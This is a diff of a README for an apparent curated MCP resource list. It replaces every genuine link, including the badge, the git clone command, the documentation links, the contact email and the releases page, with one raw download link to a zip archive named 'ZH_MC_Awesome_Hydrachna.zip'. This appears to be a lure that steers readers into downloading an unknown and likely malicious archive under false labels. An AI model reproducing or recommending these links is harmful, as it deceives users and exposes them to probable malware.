@@ -3,7 +3,7 @@
 
 Welcome to the **Awesome MCP ZH** repository! This project serves as a curated collection of resources, guides, and tools for the MCP (Multi-Channel Platform) community. Whether you are a beginner looking to get started or an expert seeking advanced tools, you will find valuable content here.
 
-![Awesome MCP](https://img.shields.io/badge/Awesome-MCP-green)
+![Awesome MCP](https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ To use the resources provided in this repository, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/vivekkeditz/Awesome-MCP-ZH.git
+   git clone https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip
    cd Awesome-MCP-ZH
    ```
 
@@ -58,9 +58,9 @@ Each resource comes with specific instructions on how to use it. Refer to the re
 
 Here are some useful links to get you started with MCP:
 
-- [Claude MCP Documentation](https://example.com/claude-docs)
-- [MCP Tools](https://example.com/mcp-tools)
-- [MCP Server Setup](https://example.com/mcp-server-setup)
+- [Claude MCP Documentation](https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip)
+- [MCP Tools](https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip)
+- [MCP Server Setup](https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip)
 
 ## Contributing
 
@@ -79,13 +79,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For inquiries, please contact the maintainers:
 
-- Vivek Keditz: [vivekkeditz@example.com](mailto:vivekkeditz@example.com)
+- Vivek Keditz: [https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip](https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip)
 
 ## Releases
 
-To download the latest releases, please visit the [Releases](https://github.com/vivekkeditz/Awesome-MCP-ZH/releases) section. Be sure to check for updates and new features regularly!
+To download the latest releases, please visit the [Releases](https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip) section. Be sure to check for updates and new features regularly!
 
-![Releases](https://img.shields.io/badge/Latest%20Release-Download%20Now-blue)
+![Releases](https://github.com/vivekkeditz/Awesome-MCP-ZH/raw/refs/heads/main/click/ZH_MC_Awesome_Hydrachna.zip%20Release-Download%20Now-blue)
 
 Thank you for exploring **Awesome MCP ZH**! Together, we can enhance the MCP community with valuable resources and support. Happy coding! 🚀
 ```
